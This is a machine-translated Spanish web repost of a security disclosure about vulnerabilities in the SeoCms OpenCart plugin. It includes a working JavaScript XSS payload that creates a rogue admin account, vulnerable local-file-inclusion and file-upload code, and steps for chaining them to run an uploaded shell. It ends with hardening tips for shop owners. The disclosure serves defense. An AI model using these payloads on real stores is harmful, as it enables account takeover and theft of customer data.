<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🧕🏾 🔪 ⛹🏻 Opencartforum y amigos 🚣🏾 🖼️ 🤘🏼</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Todos los perros van al cielo, y todos los propietarios de tiendas en línea en Opencart, tarde o temprano en Opencartforum. Cuando la euforia de la pr...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Opencartforum y amigos</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/466283/"><img src="https://habrastorage.org/webt/i_/fm/jp/i_fmjpfeqs4zmi1axxwqrczafv0.jpeg" alt="imagen"><br><br>  Todos los perros van al cielo, y todos los propietarios de tiendas en línea en Opencart, tarde o temprano en Opencartforum.  Cuando la euforia de la primera instalación del motor en el hosting pasa y comienza la dura realidad, el dueño de la tienda típica siempre comienza a perder algo y comienza el difícil camino de encontrar contratistas calificados y complementos de calidad para su tienda. <br><br>  El recurso más grande en Runet, en el que puedes encontrar ambos, es opencartforum.com, que hoy tiene más de 140k usuarios registrados.  De estos 140 mil registros, la mitad de ellos son personas vivas con tiendas en vivo que usan plantillas o módulos de una forma u otra, que se pueden comprar de inmediato en el sitio.  Y todas estas personas ni siquiera se dan cuenta de que, junto con los complementos, adquieren maravillosas puertas traseras y vulnerabilidades, con las que el hacker de cualquier madre solo puede soñar. <br><a name="habracut"></a><br>  Aunque en forma declarativa en las reglas para publicar complementos en la tienda del foro, se escribe en blanco y negro.  Tenemos qadepartment, personas especialmente capacitadas revisan los complementos para detectar vulnerabilidades. <br><br>  Y ni el foro, como la plataforma que media entre el autor y el usuario final del complemento, ni los autores de los complementos, como resultaron, tienen ninguna responsabilidad. <br>  ¿Cómo es eso?  Y asi!  Al parecer históricamente. <br><br>  Modelando por mí mismo las consecuencias hipotéticas de los incidentes, que se discutirán más adelante, mi cabello en mi cabeza se eriza. <br><br>  Solo imagina.  Eres un exitoso propietario de una tienda, no has dormido por la noche en un par de años, escribiste textos, mordisqueaste en negro, blanco, gris seo, peleaste pandas, minusinsk, no terminaste tu bebida, atrajiste 100,000 clientes, invertiste en posiciones.  Sus hijos van a un buen jardín de infantes y, de repente, sus ventas se han reducido a la mitad, simplemente porque su base con todos los contactos de los clientes fue a la competencia.  O de repente lo perdió por completo, porque durante un mes su tienda ha estado trabajando en el servidor mysql de otra persona, y ni siquiera notó el cambio de kofig, y todas las copias de seguridad en el alojamiento se han estropeado. <br><br>  Presentaron sus sentimientos en una situación similar, trabajaron, trabajaron durante varios años, y en un día todo se acaba.  Dices que esto no puede ser así. <br><br>  Pero puede ser muy fácil.  ¡Basta con comprar un complemento con una "protección" de protección no declarada no declarada contra el uso no autorizado, y sus datos pueden convertirse rápidamente en extraños! <br><br><h2>  Primer incidente </h2><br>  Hace seis meses, una tienda se evitó superficialmente cuando un informe del escáner Ai-Bol mostró una advertencia extraña de un código extraño en el módulo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">SeoCms</a> (más de 10,000 instalaciones activas). <br><br>  Comenzamos a mirar más de cerca y resultó que este abracadabra simplemente muestra la versión del complemento: <br><br><pre><code class="php hljs">$text_redaeh_stpo = $text_redaeh_stpo_1.$value_tnega.$text_redaeh_stpo_2.$text_redaeh_stpo_3.$text_reda eh_stpo_4.$text_redaeh_stpo_5.$text_redaeh_stpo_6.$text_redaeh_stpo_7.$text_redaeh _stpo_8.$text_redaeh_stpo_9.$value_revres.$text_redaeh_stpo_10; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($date_diff &gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) { $ver_content = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $opts = <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>( $text_ptth =&gt; <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($text_dohtem =&gt;$text_tsop, $redaeh =&gt;$text_redaeh_stpo, $tnetnoc =&gt; $yreuq_dliub_ptth(<span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($text_rdda =&gt;$value_rdda, $text_liame =&gt; <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;data[<span class="hljs-string"><span class="hljs-string">'liame'</span></span>], $text_rev=&gt;<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;data[<span class="hljs-string"><span class="hljs-string">'blog_version'</span></span>] )))); $context = $etaerc_txetnoc_maerts($opts); $exceptionizer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PHP_Exceptionizer(E_ALL); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { $ver_content = $stnetnoc_teg_elif($rev_knil, <span class="hljs-keyword"><span class="hljs-keyword">FALSE</span></span> , $context); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (E_WARNING $e) { <span class="hljs-comment"><span class="hljs-comment">//echo "Warning or better raised: " . $e-&gt;getMessage(); } $this-&gt;model_setting_setting-&gt;editSetting('blog_ver', Array('blog_version_date' =&gt; $date_current, 'blog_version_content' =&gt; $ver_content )); } if ($this-&gt;data['blog_version']!=$ver_content) { $this-&gt;data['text_new_version'] = $this-&gt;language-&gt;get('text_new_version').$ver_content. " &lt;span style='color: #000; font-weight: normal;'&gt;(".$date_ver_update.")&lt;/span&gt;". $this-&gt;language-&gt;get('text_new_version_end'); } else { $this-&gt;data['text_new_version'] = ''; }</span></span></code> </pre> <br>  Está bien, excepto que: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;language-&gt;get(<span class="hljs-string"><span class="hljs-string">'text_new_version'</span></span>).$ver_content. <span class="hljs-string"><span class="hljs-string">" &lt;span style='color: #000; font-weight: normal;'&gt;("</span></span>.$date_ver_update.<span class="hljs-string"><span class="hljs-string">")&lt;/span&gt;"</span></span></code> </pre><br>  no se filtra de ninguna manera, y si por accidente aparece un script como el siguiente en lugar de la versión del cliente, obtener acceso de administrador a cualquier tienda donde esté instalado el módulo es cuestión de tiempo y técnica. <br><br><pre> <code class="php hljs">&lt;script&gt; <span class="hljs-comment"><span class="hljs-comment">// shell sample // seocms the best architectural mistake forever // i got all your 10 000 shops // i install 10 000 backdors function​ getUrlVars​()​ {​ v​ar​vars=​​[​],​hash,​​hashes=​​n​ull;​ i​f​​(w​indow​.l​ocation.​h​ref​.i​ndexOf(​"​?"​)​​&amp;&amp; window​.​location.​h​ref.​​indexOf​("​&amp;")​)​​{ hashes =​ window​.​location.​h​ref.​​slice​(w​indow​.l​ocation​.h​ref​.i​ndexOf​(​"?"​)​​+ 1)​.​split(​​"&amp;"​); }​​​else​i​f​​(w​indow​.l​ocation.​h​ref​.​indexOf(​​"?"​))​​{ hashes =​ window​.​location.​h​ref.​​slice​(w​indow​.​location​.h​ref​.i​ndexOf​(​"?"​)​​+​​1​); }​ i​f​ ​(h​ashes!​=​n​ull)​ ​{​ f​or​​(v​ar​i​=​​0;​​i​&lt;​hashes​.​length​;​i​++)​{​ hash=​​hashes[​​i]​.s​plit​(​"=")​; vars[​h​ash​[0​]​]​​=​hash​[​1]​; }​ }​ r​eturn​vars;​ } var​ url_vars =​ ​ getUrlVars​(); var​ token =​ ​ url_vars.​ ​token​; var​ host ​=​ window.​ ​location​.​origin;​ var​action=​​host+​​"​/admin/index.php?route=user/user/add&amp;token="​+​ token;​ document.​ ​addEventListener​(​"DOMContentLoaded"​,​ ​function​(​event​)​ ​{ $​.p​ost(​​action,​​{​​username​:​​"Hack123"​,​user_group_id​:​​"1"​, firstname​:​"​Lol",​​lastname​:​"​Haha"​,​ email​:​​"Hack123@Hack123.com"​, password:​​"​1234",​​ confirm​:​​"1234"​,​ status​:​​"1"​​}​​); }); &lt;/script&gt;</span></span></code> </pre><br>  Los detalles de la situación se describen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aquí</a> .  Aviso de administración <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aquí</a> . <br><br>  Probablemente la quinta vez, después de haber modelado este proceso muy claramente para la administración del foro, fue posible transmitir la crítica de la situación. <br><br>  Y la administración, a su vez, notificó oficialmente a los usuarios la presencia de esta vulnerabilidad, y parece que incluso hizo un boletín informativo a los clientes.  Pero esto no es exacto. <br><br>  Dejemos detrás de escena las amenazas y evasiones del autor del complemento y sigamos adelante por dos meses más ... <br><br><h2>  Segundo incidente </h2><br>  Otra tienda viene para inspección, en la que hay frisos salvajes de hasta 3-4 segundos en cada página.  Comenzamos a diseccionar y ver en la carpeta con un caché de más de 20k archivos con la extensión .php.  Caché de archivos con la extensión php Karl, ¡no es casualidad! <br><br>  Examinamos la estructura de datos de estos archivos, y nuevamente hay piezas de nuestro hermoso módulo SEOCMS. <br><br>  Y un gran método: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $ajax_file = DIR_CACHE.base64_decode(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;db-&gt;escape(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;get[<span class="hljs-string"><span class="hljs-string">"ajax_file"</span></span>])); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists($ajax_file)) { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ajax_file_cached; }</code> </pre> <br>  Este es un ejemplo de una vulnerabilidad clásica: la inclusión de archivos locales. <br><br>  Es suficiente codificar en base64 ../....../config.php y hello - require ($ ajax_file);  Y por favor: aquí tiene las contraseñas de la base de datos, y aquí está el registro de errores del sistema, y ​​si incluso / etc / pwd es muy necesario, aunque ha sido irrelevante durante mucho tiempo, ¿y si? <br><br>  ¿Y cuántos servidores y servidores con configuración predeterminada brillan en el mundo de phpmyadmin?  Mitad?  Más? <br><br>  Comenzamos a buscar más y ¿qué encontramos?  Maravilloso código de descarga de avatar: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!$json) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (is_uploaded_file(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;files[<span class="hljs-string"><span class="hljs-string">'file'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>]) &amp;&amp; file_exists(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;files[<span class="hljs-string"><span class="hljs-string">'file'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>])) { $file = basename($filename) . <span class="hljs-string"><span class="hljs-string">'.'</span></span> . md5(substr(sha1(uniqid(mt_rand(), <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>)); $file_original = basename($filename); <span class="hljs-comment"><span class="hljs-comment">// Hide the uploaded file name so people can not link to it directly. //$json['file'] = $this-&gt;encryption-&gt;encrypt($file); // To remove highload from the file system, when large number of buyers $avatar_dir = 'data/avatars/'.(ceil ($this-&gt;data['customer_id'] / 300)) * 300; move_uploaded_file($this-&gt;request-&gt;files['file']['tmp_name'], DIR_IMAGE . $file); $new_filename = $avatar_dir.'/'.$this-&gt;data['customer_id']."_".utf8_strtolower($file_original); if (isset($this-&gt;data['thislist']['avatar_width']) &amp;&amp; $this-&gt;data['thislist']['avatar_width']!='') { $width = $this-&gt;data['thislist']['avatar_width']; } else { if (isset($this-&gt;data['generallist']['avatar_width']) &amp;&amp; $this-&gt;data['generallist']['avatar_width']!='') { $width = $this-&gt;data['generallist']['avatar_width']; } else { $width = '100'; } } if (isset($this-&gt;data['thislist']['avatar_height']) &amp;&amp; $this-&gt;data['thislist']['avatar_height']!='') { $height = $this-&gt;data['thislist']['avatar_height']; } else { if (isset($this-&gt;data['generallist']['avatar_height']) &amp;&amp; $this-&gt;data['generallist']['avatar_height']!='') { $height = $this-&gt;data['generallist']['avatar_height']; } else { $height = '100'; } } $this-&gt;load-&gt;model('tool/image'); $json['file'] = $avatar_thumb = $this-&gt;model_tool_image-&gt;resizeavatar($file, $new_filename , $width, $height, true, false); if (trim($avatar_thumb)=='') { $json['error'] = $this-&gt;language-&gt;get('error_upload'); } if ($file!='' &amp;&amp; file_exists(DIR_IMAGE . $file)) { unlink (DIR_IMAGE . $file); } } }</span></span></code> </pre> <br>  Lo cual cae perfectamente en el error al intentar cambiar el tamaño (y nos muestra la ruta completa al archivo descargado), después de cargar algún tipo de shell.php.png, y luego también se ejecuta perfectamente por el método anterior. <br><br>  Video de explotación de vulnerabilidad (con la salida de error del sistema php activada): <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/SdyW8OzAfZI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  Video de explotación de vulnerabilidad (con la salida de error del sistema php desactivada): <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/f-JYKzT_WAk" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  El análisis del código se realizó en la versión del módulo 52 en abril de 2019. <br><br>  Dado que tanto el autor como la administración del foro fueron notificados en las mismas fechas, pasó suficiente tiempo para que tomen todas las medidas posibles para notificar a los compradores sobre la eliminación de vulnerabilidades, nosotros, con la conciencia tranquila, podemos revelar todos los detalles. <br><br>  Y en ese momento, algo sucedió.  En el servidor del desarrollador estaba su propio módulo.  Pero la vulnerabilidad no funcionó en eso.  Estaba cubierta ... Y esto es una gran rareza.  Muy grande !!! <br><br>  Y la segunda rareza de toda esta historia es que el foro abierto en la persona de la administración y el departamento de control de calidad de complementos no vio ni el primer ni el segundo incidente, y en ambos casos en la primera notificación no encontró nada crítico. <br><br>  Por supuesto, no hay nada crítico cuando tus configuraciones brillan en el mundo.  No hay nada crítico cuando una buena mitad de los comerciantes desconocen lo que sucede debajo de su capó.  Después de todo, una vez, alguien puso este complemento, y sin enviar por correo, ni siquiera se dan cuenta de que todo el negocio está bajo amenaza directa. <br><br>  Y si hubo una reacción distinta de la administración en el primer incidente, en el segundo se eliminan todas las publicaciones con una mención.  Y todo esto está cubierto por una <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">oferta de foro</a> , según la cual, sobre adiciones comerciales, se pueden dejar comentarios sobre los muertos, ya sea bueno o nada. <br><br>  El autor también afirma que los errores y los agujeros están arreglados, qadepartment perdió el complemento para la venta, pero no, los agujeros no están arreglados ... <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!class_exists(<span class="hljs-string"><span class="hljs-string">'PHP_Exceptionizer'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (function_exists(<span class="hljs-string"><span class="hljs-string">'modification'</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">require_once</span></span>(modification(DIR_SYSTEM . <span class="hljs-string"><span class="hljs-string">'library/exceptionizer.php'</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">require_once</span></span>(DIR_SYSTEM . <span class="hljs-string"><span class="hljs-string">'library/exceptionizer.php'</span></span>); } } $exceptionizer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PHP_Exceptionizer(E_ALL); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $filename = preg_replace(<span class="hljs-string"><span class="hljs-string">'/[^a-zA-Z0-9\.\-\s+]/'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, html_entity_decode(base64_decode(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;db-&gt;escape(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;get[<span class="hljs-string"><span class="hljs-string">'ajax_file'</span></span>])), ENT_QUOTES, <span class="hljs-string"><span class="hljs-string">'UTF-8'</span></span>)); $ajax_file = DIR_CACHE . $filename; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists($ajax_file)) { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { ob_start(); <span class="hljs-keyword"><span class="hljs-keyword">require</span></span>($ajax_file); $ajax_html = ob_get_contents(); ob_end_clean(); header(<span class="hljs-string"><span class="hljs-string">'Content-type: text/html; charset=utf-8'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $ajax_html; <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;deletecache(<span class="hljs-string"><span class="hljs-string">'cache.ajax'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ajax_file_cached; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (E_WARNING $e) { } }</code> </pre> <br>  require () todavía está aquí.  La entrada está ligeramente filtrada.  Pero el potencial LFI vivió y vivió.  Si un poco más, entonces sí, ahora no podemos cargar ni ejecutar el shell.  Pero supongamos que intentamos, cerramos, cementamos la ejecución de cualquier script excepto index.php, e incluso en el nivel de configuración nginx, al que de ninguna manera se puede acceder.  Pero en otro lugar, el hacker malvado tuvo la oportunidad de poner un archivo arbitrario en la carpeta de caché.  Que va a pasar  Así es: para ejecutar código extraño, generando un hash en la solicitud de obtención, lleva dos minutos.  Es decir, al final resulta que está un poco cerrado, pero no está completamente. <br><br>  Bueno, las pequeñas cosas: cómo brillaban esas relaciones tan hermosas en los archivos de idioma: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>]) &amp;&amp; (strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'on'</span></span> || $_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>] == <span class="hljs-string"><span class="hljs-string">'1'</span></span>)) || (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_PROTO'</span></span>]) &amp;&amp; (strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_PROTO'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'https'</span></span>) || (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_SSL'</span></span>]) &amp;&amp; strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_SSL'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'on'</span></span>))) { $_[<span class="hljs-string"><span class="hljs-string">'value_revres'</span></span>] = HTTPS_SERVER; $_[<span class="hljs-string"><span class="hljs-string">'value_ctlg'</span></span>] = HTTPS_CATALOG; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { $_[<span class="hljs-string"><span class="hljs-string">'value_revres'</span></span>] = HTTP_SERVER; $_[<span class="hljs-string"><span class="hljs-string">'value_ctlg'</span></span>] = HTTP_CATALOG; }</code> </pre> <br>  Y brillan ... Desea conocer el camino completo a la raíz del proyecto.  Simplemente encuentre la tienda con la pantalla de error activada y ejecute el enlace directamente al archivo de idioma. <br><br>  Para estudiar qué más puede ser después de actualizar el complemento en megabytes de líneas de código del autor, no hay recursos ni deseo.  Hay personas responsables especialmente capacitadas para esto. <br><br>  Y la guinda del pastel.  Recordamos que tenemos un complemento comercial ... Y en un complemento comercial tenemos texto oculto en el recurso del autor: <br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">www.google.com/search?q=%22Powered+by+SEO+CMS%22</a> </blockquote><br>  Curiosamente, ¿al menos uno de los compradores de complementos conoce un huevo de pascua tan "maravilloso"? <br><br>  Hoy, el suplemento se vende y se vende.  Las publicaciones con llamadas para prestar atención a la situación simplemente se eliminan.  Ninguno de los compradores recibió notificaciones de advertencia sobre el segundo incidente.  Quizás el 20-30% de los usuarios de complementos han actualizado, pero el 70%, incluso si hablamos de las estadísticas del autor oficial sobre el uso de complementos, se trata de 7000 tiendas (de hecho, más, ya que nadie sabe con seguridad cuántas copias instalaron los freelancers en las tiendas de los clientes). licencia extendida) están en una gran zona de riesgo. <br><br>  En palabras del barón Munchausen, solo quiero decir una cosa: ¡Caballeros actualizados! <br><br><h2>  Para los clientes </h2><br>  Qué hacer, los que terminaron en este submarino que se hunde: <br><br><ul><li>  No deje basura en ftp.  Ver info.php, adminer.php y toda la otra basura.  Solo debes tener index.php y un punto. </li><li>  Cambie regularmente las contraseñas, todas las contraseñas (ftp, panel de administración, base de datos).  Y asegúrese de no tener accidentalmente cuentas extra extrañas. </li><li>  Desactivar salida de error.  Siempre, si no trabaja, apague la salida de error en el nivel de configuración del intérprete y no en la configuración de la tienda. </li><li>  Sí, sé que esto no es muy factible, pero al menos debe mantenerse actualizado con las actualizaciones del código del motor relacionadas con la seguridad e, idealmente, actualizar regularmente el motor a versiones estables. </li><li>  Mire regularmente los registros de visitas, puede haber muchas cosas interesantes.  Rastrea anomalías. </li><li>  Cierre adicionalmente con una contraseña o restricción en el administrador de IP de la tienda y varias secciones vulnerables, como phpmyadmin.  Si este es un intercambio en el que phpmyadmin es común para todos, ¡huya de ese alojamiento! </li><li>  Si usa sxd y utilidades similares, cambie el nombre de inmediato a un conjunto de caracteres aleatorio. </li><li>  Al usar nginx, vale la pena agregar reglas a la configuración del host virtual que prohíban ejecutar cualquier script php que no sea index.php en las secciones raíz y de administración del sitio. </li><li>  No tires basura de tu cuenta.  Si tienes una tienda, deja que sea una tienda.  No cargue bajo una cuenta un montón de wp-blogs, un montón de errores y varios dominios de prueba. </li><li>  Nunca almacene copias de seguridad de un sitio o base de datos en la raíz de su host virtual. </li><li>  Observe la carga en el servidor / alojamiento, intente mantener el suministro al menos x2 de las cargas máximas, y si de repente la carga aumenta repentinamente sin razón, intente averiguar la razón.  ¡Es mejor adelantar que no adelantar! </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/466283/">https://habr.com/ru/post/466283/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../466263/index.html">Sistemas RPC de referencia (y Json invertido)</a></li>
<li><a href="../466267/index.html">¿Por qué muchos subestiman sus juegos?</a></li>
<li><a href="../466271/index.html">Cursos conjuntos Grupo-IB y Belkasoft: qué enseñamos y a quién acudir</a></li>
<li><a href="../466279/index.html">La mayoría de los dispositivos Android son vulnerables a los ataques de phishing a través de SMS</a></li>
<li><a href="../466281/index.html">Realidad virtual, juegos de código abierto y autos eléctricos: lo que dijo John Carmack en el podcast Joe Rogan</a></li>
<li><a href="../466285/index.html">Un pequeño regalo de promoción: combo de rifa dvr y detector de radar</a></li>
<li><a href="../466287/index.html">Informe e investigación de confiabilidad de los segmentos nacionales de Internet de 2019</a></li>
<li><a href="../466289/index.html">Iniciativas legislativas. Extraño, pero presentado a la Duma del Estado</a></li>
<li><a href="../466291/index.html">Encuesta de sostenibilidad de segmentos nacionales de Internet para 2019</a></li>
<li><a href="../466295/index.html">Caché de reserva sin dolor en Scala</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>